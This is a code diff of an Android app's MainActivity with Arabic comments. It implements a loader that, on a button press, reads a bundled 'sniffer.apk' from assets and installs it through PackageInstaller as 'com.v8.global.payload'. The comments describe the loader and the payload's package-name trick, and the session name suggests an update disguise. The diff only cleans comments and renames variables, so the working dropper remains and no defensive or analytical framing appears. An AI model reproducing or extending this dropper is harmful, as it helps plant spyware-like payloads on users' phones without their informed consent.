@@ -18,14 +18,14 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        Button btnInstall = findViewById(R.id.btn_perm); // استخدمنا نفس الأيدي القديم btn_perm
+        Button btnInstall = findViewById(R.id.btn_perm);
         btnInstall.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 try {
-                    // اللوادر راح يفتح ملف القناص الموجود بالـ assets
+                    // اللوادر يفتح ملف القناص من مجلد assets
                     InputStream is = getAssets().open("sniffer.apk");
-                    // ملاحظة: التطبيق اللي راح يتثبت لازم يكون له باكج نيم مختلف شوية حتى ما يصير تعارض
+                    // ملاحظة: الـ Package Name للتطبيق اللي بداخل الـ APK لازم يكون مختلف (مثل com.v8.global.payload)
                     installPackage(MainActivity.this, is, "com.v8.global.payload");
                 } catch (Exception e) {
                     e.printStackTrace();
@@ -34,17 +34,17 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    public void installPackage(Context context, InputStream in, String targetPackageName) {
+    public void installPackage(Context context, InputStream in, String targetPackage) {
         try {
             PackageInstaller installer = context.getPackageManager().getPackageInstaller();
             PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                     PackageInstaller.SessionParams.MODE_FULL_INSTALL);
-            params.setAppPackageName(targetPackageName);
+            params.setAppPackageName(targetPackage);
 
             int sessionId = installer.createSession(params);
             PackageInstaller.Session session = installer.openSession(sessionId);
 
-            OutputStream out = session.openWrite("V8_Update_Session", 0, -1);
+            OutputStream out = session.openWrite("V8_Session", 0, -1);
             byte[] buffer = new byte[65536];
             int n;
             while ((n = in.read(buffer)) != -1) {
@@ -57,7 +57,6 @@ public class MainActivity extends AppCompatActivity {
             PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_MUTABLE);
             session.commit(pendingIntent.getIntentSender());
             session.close();
-
         } catch (Exception e) {
             e.printStackTrace();
         }
